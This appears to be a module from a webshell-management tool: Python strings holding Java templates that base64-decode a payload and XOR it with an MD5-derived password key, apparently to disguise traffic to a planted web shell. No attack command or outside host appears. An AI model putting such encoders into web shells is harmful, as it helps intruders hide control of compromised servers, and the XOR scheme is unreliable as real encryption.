# XOR-MD5
code = """
    private byte[] cipher(
        byte[] payload, String alg, byte[] key, boolean isEnc
    ) {
        try {
            byte[] result = new byte[payload.length];
            for (int i = 0; i < result.length; i++) {
                result[i] = (byte) (payload[i] ^ key[i + 1 & 15]);
            }
            return result;
        } catch (Exception e) {
            return null;
        }
    }

    private String hasher(String str, String alg) {
        try {
            java.security.MessageDigest h =
                java.security.MessageDigest.getInstance(alg);
            h.update(str.getBytes(), 0, str.length());
            return new java.math.BigInteger(1, h.digest()).toString(16);
        } catch (Exception e) {
            return null;
        }
    }

    private byte[] decoder(String payload) {
        return cipher(
            b64decode(payload), "XOR",
            hasher(password, "MD5").substring(0, 16).getBytes(), false
        );
    }
"""

proc = """
            Class base64;
            Object decoder;
            byte[] bytes = null;
            java.security.MessageDigest h;

            try {
                base64 = Class.forName("java.util.Base64");
                decoder = base64.getMethod("getDecoder")
                    .invoke(base64);
                bytes = (byte[]) decoder.getClass()
                    .getMethod("decode", String.class)
                    .invoke(decoder, payload);
            } catch (ClassNotFoundException e) {
                try {
                    base64 = Class.forName("sun.misc.BASE64Decoder");
                    decoder = base64.newInstance();
                    bytes = (byte[]) decoder.getClass()
                        .getMethod("decodeBuffer", String.class)
                        .invoke(decoder, payload);
                } catch (Exception ex) {}
            } catch (Exception ex) {}

            h = java.security.MessageDigest.getInstance("MD5");
            h.update(password.getBytes(), 0, password.length());
            byte[] key = new BigInteger(1, h.digest()).toString(16)
                .substring(0, 16).getBytes();

            byte[] result = new byte[bytes.length];
            for (int i = 0; i < result.length; i++) {
                result[i] = (byte) (bytes[i] ^ key[i + 1 & 15]);
            }
            bytes = result;
"""